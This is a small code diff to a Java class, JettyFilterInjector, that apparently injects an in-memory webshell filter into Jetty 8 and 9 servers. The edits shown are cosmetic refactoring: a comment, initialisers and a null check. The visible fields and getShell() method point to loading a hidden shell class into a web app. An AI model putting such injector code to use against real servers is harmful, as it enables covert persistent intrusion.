@@ -9,7 +9,7 @@ import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 /**
- * tested v8、v9
+ * 覆盖 Jetty 8、9。
  *
  * @author ReaJason
  */
@@ -17,7 +17,7 @@ import java.util.zip.GZIPInputStream;
 public class JettyFilterInjector {
 
     
-    private static boolean ok = false;
+    private static boolean ok;
 
     private static String shellClassName;
     private static String shellClass;
@@ -33,9 +33,7 @@ public class JettyFilterInjector {
         } catch (Throwable throwable) {
             
         }
-        if (contexts == null || contexts.isEmpty()) {
-        
-        } else {
+        if (contexts != null) {
             for (Object context : contexts) {
                 try {
                  
@@ -161,7 +159,7 @@ public class JettyFilterInjector {
     
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz = null;
+        Class<?> clazz;
         try {
             clazz = classLoader.loadClass(shellClassName);
         } catch (Exception e) {
